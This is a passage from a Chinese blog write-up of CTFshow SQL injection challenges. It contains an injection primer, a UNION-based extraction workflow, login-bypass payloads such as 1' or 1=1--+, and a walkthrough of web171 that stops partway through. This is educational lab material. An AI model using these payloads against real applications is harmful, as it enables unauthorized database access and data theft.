<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Hsad"><meta name="copyright" content="Hsad"><meta name="generator" content="Hexo 7.2.0"><meta name="theme" content="hexo-theme-yun"><title>EZsql | Hsad's Blog</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/png" href="/favicon.ico"><link rel="mask-icon" href="/favicon.ico" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"hsad.xyz","root":"/","title":"所以你弃权","version":"1.10.11","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><meta name="description" content="前言SQL注入原理1.SQL注入概念及产生原因：当web应用向后台数据库传递SQL语句进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊 的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。 2.SQL注入的本质：把用户输入的数据当作代码来执行，违背了“数据与代码分离”的原则 3.SQL注入的两个关键点：1.用户能控制输入的内容；  2.web应用把">
<meta property="og:type" content="article">
<meta property="og:title" content="EZsql">
<meta property="og:url" content="https://hsad.xyz/2024/07/05/EZsql/index.html">
<meta property="og:site_name" content="Hsad&#39;s Blog">
<meta property="og:description" content="前言SQL注入原理1.SQL注入概念及产生原因：当web应用向后台数据库传递SQL语句进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊 的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。 2.SQL注入的本质：把用户输入的数据当作代码来执行，违背了“数据与代码分离”的原则 3.SQL注入的两个关键点：1.用户能控制输入的内容；  2.web应用把">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://hsad.xyz/2024/07/05/EZsql/web183.png">
<meta property="og:image" content="https://hsad.xyz/2024/07/05/EZsql/web184.png">
<meta property="og:image" content="https://hsad.xyz/2024/07/05/EZsql/web184_2.png">
<meta property="og:image" content="https://hsad.xyz/2024/07/05/EZsql/web185.png">
<meta property="og:image" content="https://hsad.xyz/2024/07/05/EZsql/web185_2.png">
<meta property="og:image" content="https://hsad.xyz/2024/07/05/EZsql/web187.png">
<meta property="og:image" content="https://hsad.xyz/2024/07/05/EZsql/web188.png">
<meta property="og:image" content="https://hsad.xyz/2024/07/05/EZsql/web201.png">
<meta property="og:image" content="https://hsad.xyz/2024/07/05/EZsql/web201_2.png">
<meta property="og:image" content="https://hsad.xyz/2024/07/05/EZsql/web201_3.png">
<meta property="og:image" content="https://hsad.xyz/2024/07/05/EZsql/web201_4.png">
<meta property="og:image" content="https://hsad.xyz/2024/07/05/EZsql/web201_5.png">
<meta property="og:image" content="https://hsad.xyz/2024/07/05/EZsql/web205.png">
<meta property="og:image" content="https://hsad.xyz/2024/07/05/EZsql/web214.png">
<meta property="og:image" content="https://hsad.xyz/2024/07/05/EZsql/web218.png">
<meta property="og:image" content="https://hsad.xyz/2024/07/05/EZsql/web221.png">
<meta property="article:published_time" content="2024-07-05T07:50:17.000Z">
<meta property="article:modified_time" content="2024-07-10T15:28:30.401Z">
<meta property="article:author" content="Hsad">
<meta property="article:tag" content="CTFshow">
<meta property="article:tag" content="Sql注入">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hsad.xyz/2024/07/05/EZsql/web183.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Hsad"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="Hsad"><span class="site-author-status" title="凉">☺️</span></a><div class="site-author-name"><a href="/about/">Hsad</a></div><span class="site-name">Hsad's Blog</span><sub class="site-subtitle">一个人的世界</sub><div class="site-description">翻着我们的照片 想念若隐若现</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">9</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">4</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">11</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://qm.qq.com/cgi-bin/qm/qr?k=EYiK7-b5ur1mWxbX7aV2AEBsuoW9c732" title="QQ" target="_blank" style="color:orange"><span class="icon iconify" data-icon="ri:qq-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/watanabe-hsad" title="GitHub" target="_blank" style="color:#181717"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:dubian.zzy@outlook.com" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">SQL注入原理</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-SQL%E6%B3%A8%E5%85%A5%E6%A6%82%E5%BF%B5%E5%8F%8A%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0%EF%BC%9A"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.SQL注入概念及产生原因：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E6%9C%AC%E8%B4%A8%EF%BC%9A"><span class="toc-number">1.1.2.</span> <span class="toc-text">2.SQL注入的本质：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E4%B8%A4%E4%B8%AA%E5%85%B3%E9%94%AE%E7%82%B9%EF%BC%9A"><span class="toc-number">1.1.3.</span> <span class="toc-text">3.SQL注入的两个关键点：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E5%8D%B1%E5%AE%B3%EF%BC%9A"><span class="toc-number">1.1.4.</span> <span class="toc-text">SQL注入基础危害：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MYSQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5-%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">MYSQL数据库注入-常用函数：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%EF%BC%88%E8%81%94%E5%90%88%EF%BC%89%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">SQL（联合）注入流程：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mysql%E6%93%8D%E4%BD%9C%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7%EF%BC%9A%EF%BC%88%E6%95%B0%E5%AD%97%E8%B6%8A%E5%A4%A7%EF%BC%8C%E4%BC%98%E5%85%88%E7%BA%A7%E8%B6%8A%E9%AB%98%EF%BC%89"><span class="toc-number">1.4.</span> <span class="toc-text">mysql操作符优先级：（数字越大，优先级越高）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E2%80%93%E6%99%AE%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%BF%85%E5%A4%87%E6%9D%A1%E4%BB%B6%EF%BC%9A"><span class="toc-number">1.5.</span> <span class="toc-text">总结–普通SQL注入必备条件：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web171-253"><span class="toc-number">2.</span> <span class="toc-text">web171-253</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#web171-%E5%8D%95%E5%BC%95%E5%8F%B7%E9%97%AD%E5%90%88"><span class="toc-number">2.1.</span> <span class="toc-text">web171(单引号闭合)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web172"><span class="toc-number">2.2.</span> <span class="toc-text">web172</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web173-%E5%9B%9E%E6%98%BE%E6%A3%80%E6%B5%8B"><span class="toc-number">2.3.</span> <span class="toc-text">web173(回显检测)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web174-replace"><span class="toc-number">2.4.</span> <span class="toc-text">web174(replace)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web175"><span class="toc-number">2.5.</span> <span class="toc-text">web175</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web176-%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">2.6.</span> <span class="toc-text">web176(大小写绕过)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web177-%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC"><span class="toc-number">2.7.</span> <span class="toc-text">web177(&#x2F;**&#x2F;绕过空格)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web178-090a0b0c0d%E7%BB%95%E7%A9%BA%E6%A0%BC"><span class="toc-number">2.8.</span> <span class="toc-text">web178(%090a0b0c0d绕空格*)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web179"><span class="toc-number">2.9.</span> <span class="toc-text">web179</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web180-%E9%97%AD%E5%90%88%E7%BB%95%E8%BF%87-23"><span class="toc-number">2.10.</span> <span class="toc-text">web180(闭合绕过%23)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web181"><span class="toc-number">2.11.</span> <span class="toc-text">web181</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web182-like%E6%A8%A1%E7%B3%8A%E5%8C%B9%E9%85%8D"><span class="toc-number">2.12.</span> <span class="toc-text">web182(like模糊匹配)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web183-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.13.</span> <span class="toc-text">web183(布尔盲注)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web184-right-join-having"><span class="toc-number">2.14.</span> <span class="toc-text">web184(right join   having)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web185-true%E7%BB%95%E8%BF%87%E6%95%B0%E5%AD%97"><span class="toc-number">2.15.</span> <span class="toc-text">web185(true绕过数字)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web186"><span class="toc-number">2.16.</span> <span class="toc-text">web186</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web187-ffifdyop%E7%BB%95%E8%BF%87md5"><span class="toc-number">2.17.</span> <span class="toc-text">web187(ffifdyop绕过md5)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web188-%E5%BC%B1%E6%AF%94%E8%BE%83"><span class="toc-number">2.18.</span> <span class="toc-text">web188(&#x3D;&#x3D;弱比较)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web189-locate-load-file"><span class="toc-number">2.19.</span> <span class="toc-text">web189(locate load_file)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web190-%E5%B8%B8%E8%A7%84bool-blind"><span class="toc-number">2.20.</span> <span class="toc-text">web190(常规bool blind)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web191-ord"><span class="toc-number">2.21.</span> <span class="toc-text">web191(ord)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web192-regexp"><span class="toc-number">2.22.</span> <span class="toc-text">web192(regexp)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web193-left-right"><span class="toc-number">2.23.</span> <span class="toc-text">web193(left right)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web194-lpad"><span class="toc-number">2.24.</span> <span class="toc-text">web194(lpad)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web195-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">2.25.</span> <span class="toc-text">web195(堆叠注入)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web196-select-row-0"><span class="toc-number">2.26.</span> <span class="toc-text">web196(select row[0])</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web197-alert%E4%BF%AE%E6%94%B9%E5%AD%97%E6%AE%B5-show-tables-drop"><span class="toc-number">2.27.</span> <span class="toc-text">web197(alert修改字段  show tables  drop)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web198"><span class="toc-number">2.28.</span> <span class="toc-text">web198</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#wen199"><span class="toc-number">2.29.</span> <span class="toc-text">wen199</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web200"><span class="toc-number">2.30.</span> <span class="toc-text">web200</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web201-Sqlmap-%E2%80%93referer"><span class="toc-number">2.31.</span> <span class="toc-text">web201(Sqlmap –referer)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web202-%E2%80%93data"><span class="toc-number">2.32.</span> <span class="toc-text">web202(–data)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web203-%E2%80%93method-PUT"><span class="toc-number">2.33.</span> <span class="toc-text">web203(–method&#x3D;PUT)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web204-%E2%80%93cookie"><span class="toc-number">2.34.</span> <span class="toc-text">web204(–cookie)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web205-api%E6%9D%83%E9%99%90"><span class="toc-number">2.35.</span> <span class="toc-text">web205(api权限)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web206"><span class="toc-number">2.36.</span> <span class="toc-text">web206</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web207-%E2%80%93tamper"><span class="toc-number">2.37.</span> <span class="toc-text">web207(–tamper)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web208"><span class="toc-number">2.38.</span> <span class="toc-text">web208</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web209"><span class="toc-number">2.39.</span> <span class="toc-text">web209</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web210"><span class="toc-number">2.40.</span> <span class="toc-text">web210</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web211"><span class="toc-number">2.41.</span> <span class="toc-text">web211</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web212"><span class="toc-number">2.42.</span> <span class="toc-text">web212</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web213-%E2%80%93os-shell"><span class="toc-number">2.43.</span> <span class="toc-text">web213(–os-shell)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web214-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.44.</span> <span class="toc-text">web214(时间盲注)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web215"><span class="toc-number">2.45.</span> <span class="toc-text">web215</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web216-to-base64"><span class="toc-number">2.46.</span> <span class="toc-text">web216(to_base64)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web217-benchmark"><span class="toc-number">2.47.</span> <span class="toc-text">web217(benchmark)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web218"><span class="toc-number">2.48.</span> <span class="toc-text">web218</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web219"><span class="toc-number">2.49.</span> <span class="toc-text">web219</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web220"><span class="toc-number">2.50.</span> <span class="toc-text">web220</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web221-limit%E6%B3%A8%E5%85%A5"><span class="toc-number">2.51.</span> <span class="toc-text">web221(limit注入)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web222-group%E6%B3%A8%E5%85%A5"><span class="toc-number">2.52.</span> <span class="toc-text">web222(group注入)</span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://hsad.xyz/2024/07/05/EZsql/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Hsad"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Hsad's Blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">EZsql</h1><div class="post-meta"><div class="post-time"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2024-07-05 15:50:17" itemprop="dateCreated datePublished" datetime="2024-07-05T15:50:17+08:00">2024-07-05</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="修改时间：2024-07-10 23:28:30" itemprop="dateModified" datetime="2024-07-10T23:28:30+08:00">2024-07-10</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">安全相关</span></a></span> > <span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/Web/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">Web</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/CTFshow/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">CTFshow</span></a><a class="tag-item" href="/tags/Sql%E6%B3%A8%E5%85%A5/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">Sql注入</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><h4 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h4><h5 id="1-SQL注入概念及产生原因："><a href="#1-SQL注入概念及产生原因：" class="headerlink" title="1.SQL注入概念及产生原因："></a>1.SQL注入概念及产生原因：</h5><p>当web应用向后台数据库传递SQL语句进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊</p>
<p>的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。</p>
<h5 id="2-SQL注入的本质："><a href="#2-SQL注入的本质：" class="headerlink" title="2.SQL注入的本质："></a>2.SQL注入的本质：</h5><p>把用户输入的数据当作代码来执行，违背了“数据与代码分离”的原则</p>
<h5 id="3-SQL注入的两个关键点："><a href="#3-SQL注入的两个关键点：" class="headerlink" title="3.SQL注入的两个关键点："></a>3.SQL注入的两个关键点：</h5><p>1.用户能控制输入的内容； </p>
<p>2.web应用把用户输入的内容带入到数据库执行；</p>
<h5 id="SQL注入基础危害："><a href="#SQL注入基础危害：" class="headerlink" title="SQL注入基础危害："></a>SQL注入基础危害：</h5><p>1.盗取网站的敏感信息;</p>
<p>2.绕过网站后台认证 后台登录语句： </p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT * FROM admin WHERE Username&#x3D;‘user’ and Password&#x3D;‘pass’ 万能密码：‘or ’1‘ &#x3D; ’1‘ # ;</code></pre>

<p>3.借助SQL注入漏洞提权获取系统权限;</p>
<p>4.读取文件信息。</p>
<h4 id="MYSQL数据库注入-常用函数："><a href="#MYSQL数据库注入-常用函数：" class="headerlink" title="MYSQL数据库注入-常用函数："></a>MYSQL数据库注入-常用函数：</h4><p>（1）user() 返回当前使用数据库的用户，也就是网站配置文件中连接数据库的账号 </p>
<p>（2）version() 返回当前数据库的版本 </p>
<p>（3）database() 返回当前使用的数据库，只有在use命令选择一个数据库之后，才能查到 </p>
<p>（4）group_concat() 把数据库中的某列数据或某几列数据合并为一个字符串 </p>
<p>（5）@@datadir 数据库路径 </p>
<p>（6）@@version_compile_os 操作系统版本</p>
<h4 id="SQL（联合）注入流程："><a href="#SQL（联合）注入流程：" class="headerlink" title="SQL（联合）注入流程："></a>SQL（联合）注入流程：</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">?id&#x3D;1 and 1&#x3D;1</code></pre>

<p>1、判断有无闭合 </p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">and 1&#x3D;1 and 1&#x3D;2 &#x2F;&#x2F;结果和第一个一样说明需要闭合，反之无闭合 有闭合则需要用到 --+闭合</code></pre>

<p>2、猜解字段</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">order by 10 &#x2F;&#x2F;采用二分法 </code></pre>

<p>3、判断数据回显位置 </p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">-1 union select 1，2，3，4，5.... &#x2F;&#x2F;参数等号后面加-表示不显示当前数据 </code></pre>

<p>4、获取当前数据库名、用户、版本 union select version(),database()，user()，4…… 4、获取全部数据库名</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">union select 1,2,(select group_concat(schema_name)from information_schema.schemata)</code></pre>


<p>5、获取表名</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">union select 1,2,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;库名&#39;</code></pre>

<p>6、获取字段名</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">union select 1,2,(select group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;表名&#39;</code></pre>

<p>7、获取数据</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">union select 1,2,(select group_concat(字段1，字段2)from 库名.表名</code></pre>

<p>函数名称： 函数功能：</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">查 库： select schema_name from information_schema.schema
查 表： select table_name from information_schema.tables where table_schema&#x3D;库名
查 列： select column_name from information_schema.columns where table_name&#x3D;表名
查数据： select 列名 from 库名.表名</code></pre>

<blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/fly_enum/article/details/135307756">SQL注入原理及思路绕过</a></p>
</blockquote>
<p>万能密码：</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39; or 1&#x3D;1--+</code></pre>

<h4 id="mysql操作符优先级：（数字越大，优先级越高）"><a href="#mysql操作符优先级：（数字越大，优先级越高）" class="headerlink" title="mysql操作符优先级：（数字越大，优先级越高）"></a>mysql操作符优先级：（数字越大，优先级越高）</h4><p>优先级	运算符<br>1	:&#x3D;<br>2	|| , OR , XOR<br>3	&amp;&amp; , AND<br>4	NOT<br>5	BETWEEN, CASE, WHEN, THEN, ELSE<br>6	&#x3D;, &lt;&#x3D;&gt;, &gt;&#x3D;, &gt;, &lt;&#x3D;, &lt;, &lt;&gt;, !&#x3D;, IS, LIKE, REGEXP, IN<br>7	|<br>8	&amp;<br>9	&lt;&lt;, &gt;&gt;<br>10	-, +<br>11	*, &#x2F;, DIV, %, MOD<br>12	^<br>13	- (一元减号), ~ (一元比特反转)<br>14	!<br>15	BINARY, COLLATE</p>
<h4 id="总结–普通SQL注入必备条件："><a href="#总结–普通SQL注入必备条件：" class="headerlink" title="总结–普通SQL注入必备条件："></a>总结–普通SQL注入必备条件：</h4><p>1、界面能够回显数据库查询到的数据（必要条件）；</p>
<p>2、界面回显内容至少能够显示数据库中的某列数据（必要条件）；</p>
<p>3、部分能够直接提供数据库报错内容的回显；</p>
<h3 id="web171-253"><a href="#web171-253" class="headerlink" title="web171-253"></a>web171-253</h3><h4 id="web171-单引号闭合"><a href="#web171-单引号闭合" class="headerlink" title="web171(单引号闭合)"></a>web171(单引号闭合)</h4><p>查询语句</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">&#x2F;&#x2F;拼接sql语句查找指定ID用户
$sql &#x3D; &quot;select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code></pre>

<p>根据流程拿到库 表 列名，最后拿到flag</p>
<p>第一题所以流程详细一点</p>
<p>首先尝试1’–+，发现有返回值；说明直接闭合正确；</p>
<p>接着找用来输出的列：<code>1&#39; order by 3--+</code>，发现一共有3行(就1,2,3,4,5慢慢试出来)</p>
<p>查看数据库：<code>1&#39; union select 1,2,database()--+</code>得到数据库名为<code>ctfshow_web</code></p>
<p>爆破表名：<code>-1&#39; union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schecma=database()--+</code>得到表名：<code>ctfshow_user</code></p>
<p>爆破列名：<code>1&#39; union select 1,2,group_concat(column_name) FROM information_schema.columns where table_schema=database() and table_name=&#39;ctfshow_user&#39;--+</code>，得到列名：<code>id,username,password</code></p>
<p>爆破信息：<code>1&#39; union select 1,2,group_concat(id,username,password) FROM ctfshow_user--+</code>，拿到flag。</p>
<p>整理一下：</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">爆出有哪些位置可以进行输出数据
1&#39; order by 3--+
查看数据库名字
1&#39; union select 1,2,database()--+
爆破表名：
